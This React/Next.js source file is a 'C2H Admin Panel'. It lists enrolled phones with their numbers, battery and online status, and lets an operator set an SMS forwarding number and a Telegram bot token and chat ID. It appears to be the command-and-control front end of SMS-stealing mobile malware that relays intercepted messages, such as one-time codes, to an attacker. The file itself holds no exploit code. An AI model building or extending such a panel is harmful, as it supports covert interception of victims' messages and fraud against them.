"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Smartphone, Battery, Trash2 } from "lucide-react"
import { useRouter } from "next/navigation"

interface Device {
  device_id: string
  device_name: string
  os_version: string
  phone_number: string
  battery_level: number
  is_online: boolean
  created_at: string
}

export default function AdminPanel() {
  const [devices, setDevices] = useState<Device[]>([])
  const [showForwardDialog, setShowForwardDialog] = useState(false)
  const [showTelegramDialog, setShowTelegramDialog] = useState(false)
  const [forwardNumber, setForwardNumber] = useState("")
  const [telegramToken, setTelegramToken] = useState("")
  const [telegramChatId, setTelegramChatId] = useState("")
  const router = useRouter()

  const fetchDevices = async () => {
    try {
      const res = await fetch("/api/devices")
      const data = await res.json()
      setDevices(data)
    } catch (error) {
      console.error("Failed to fetch devices:", error)
    }
  }

  useEffect(() => {
    fetchDevices()
    // Auto-refresh every 2 seconds for live updates
    const interval = setInterval(fetchDevices, 2000)
    return () => clearInterval(interval)
  }, [])

  const handleUpdateForwarding = async () => {
    try {
      await fetch("/api/config/sms_forward", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ forward_number: forwardNumber }),
      })
      setShowForwardDialog(false)
      setForwardNumber("")
    } catch (error) {
      console.error("Failed to update forwarding:", error)
    }
  }

  const handleUpdateTelegram = async () => {
    try {
      await fetch("/api/config/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          telegram_bot_token: telegramToken,
          telegram_chat_id: telegramChatId,
        }),
      })
      setShowTelegramDialog(false)
      setTelegramToken("")
      setTelegramChatId("")
    } catch (error) {
      console.error("Failed to update telegram:", error)
    }
  }

  const handleDeleteDevice = async (deviceId: string, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!confirm("Are you sure you want to delete this device?")) return

    try {
      await fetch(`/api/device/${deviceId}`, {
        method: "DELETE",
      })
      fetchDevices()
    } catch (error) {
      console.error("Failed to delete device:", error)
    }
  }

  return (
    <div className="min-h-screen bg-black text-white p-4 md:p-6">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <div className="text-center">
          <h1 className="text-3xl md:text-4xl font-bold mb-6 bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
            C2H Admin Panel
          </h1>
        </div>

        {/* Main Buttons */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <Button
            onClick={() => setShowForwardDialog(true)}
            className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900 rounded-full"
          >
            UPDATE FORWARDING
          </Button>
          <Button
            onClick={() => setShowTelegramDialog(true)}
            className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 rounded-full"
          >
            UPDATE TELEGRAM
          </Button>
        </div>

        {/* Device List */}
        <div className="space-y-4">
          <h2 className="text-xl font-semibold">Connected Devices</h2>
          {devices.length === 0 ? (
            <Card className="bg-zinc-900 border-zinc-800 p-6 text-center text-zinc-400">No devices registered yet</Card>
          ) : (
            devices.map((device) => (
              <Card
                key={device.device_id}
                className="bg-zinc-900 border-zinc-800 p-4 cursor-pointer hover:bg-zinc-800 transition-colors"
                onClick={() => router.push(`/device/${device.device_id}`)}
              >
                <div className="flex items-start justify-between gap-4">
                  <div className="flex-1 space-y-2">
                    <div className="flex items-center justify-between flex-wrap gap-2">
                      <h3 className="text-lg font-semibold">{device.device_name}</h3>
                      <Badge
                        className={
                          device.is_online
                            ? "bg-green-500/20 text-green-400 border-green-500/50"
                            : "bg-red-500/20 text-red-400 border-red-500/50"
                        }
                      >
                        {device.is_online ? "Online" : "Offline"}
                      </Badge>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-sm text-zinc-400">
                      <div className="flex items-center gap-2">
                        <Smartphone className="w-4 h-4" />
                        <span className="break-all">{device.phone_number}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Battery className="w-4 h-4" />
                        <span>{device.battery_level}%</span>
                      </div>
                    </div>

                    <div className="text-sm text-zinc-500">{device.os_version}</div>
                  </div>

                  <Button
                    variant="ghost"
                    size="icon"
                    onClick={(e) => handleDeleteDevice(device.device_id, e)}
                    className="text-red-400 hover:text-red-300 hover:bg-red-500/10 flex-shrink-0"
                  >
                    <Trash2 className="w-5 h-5" />
                  </Button>
                </div>
              </Card>
            ))
          )}
        </div>
      </div>

      {/* Forward Number Dialog */}
      <Dialog open={showForwardDialog} onOpenChange={setShowForwardDialog}>
        <DialogContent className="bg-zinc-900 border-zinc-800 text-white">
          <DialogHeader>
            <DialogTitle>Update Forwarding Number</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="forward">Forwarding Number</Label>
              <Input
                id="forward"
                placeholder="+919876543210"
                value={forwardNumber}
                onChange={(e) => setForwardNumber(e.target.value)}
                className="bg-zinc-800 border-zinc-700"
              />
            </div>
          </div>
          <DialogFooter className="flex-col sm:flex-row gap-2">
            <Button variant="outline" onClick={() => setShowForwardDialog(false)} className="w-full sm:w-auto">
              CANCEL
            </Button>
            <Button
              onClick={handleUpdateForwarding}
              className="w-full sm:w-auto bg-gradient-to-r from-purple-600 to-purple-800"
            >
              UPDATE
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Telegram Dialog */}
      <Dialog open={showTelegramDialog} onOpenChange={setShowTelegramDialog}>
        <DialogContent className="bg-zinc-900 border-zinc-800 text-white">
          <DialogHeader>
            <DialogTitle>Update Telegram Details</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="token">Bot Token</Label>
              <Input
                id="token"
                placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
                value={telegramToken}
                onChange={(e) => setTelegramToken(e.target.value)}
                className="bg-zinc-800 border-zinc-700"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="chatid">Chat ID</Label>
              <Input
                id="chatid"
                placeholder="-1001234567890"
                value={telegramChatId}
                onChange={(e) => setTelegramChatId(e.target.value)}
                className="bg-zinc-800 border-zinc-700"
              />
            </div>
          </div>
          <DialogFooter className="flex-col sm:flex-row gap-2">
            <Button variant="outline" onClick={() => setShowTelegramDialog(false)} className="w-full sm:w-auto">
              CANCEL
            </Button>
            <Button
              onClick={handleUpdateTelegram}
              className="w-full sm:w-auto bg-gradient-to-r from-blue-600 to-cyan-600"
            >
              UPDATE
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  )
}
